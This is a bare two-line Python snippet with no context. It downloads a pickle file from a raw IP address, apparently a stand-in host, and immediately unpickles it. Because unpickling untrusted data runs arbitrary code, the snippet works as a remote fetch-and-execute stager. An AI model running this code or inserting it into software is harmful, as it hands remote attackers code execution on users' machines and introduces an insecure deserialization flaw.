import pickle, urllib.request
pickle.loads(urllib.request.urlopen('http://203.0.113.4/m.pkl').read())
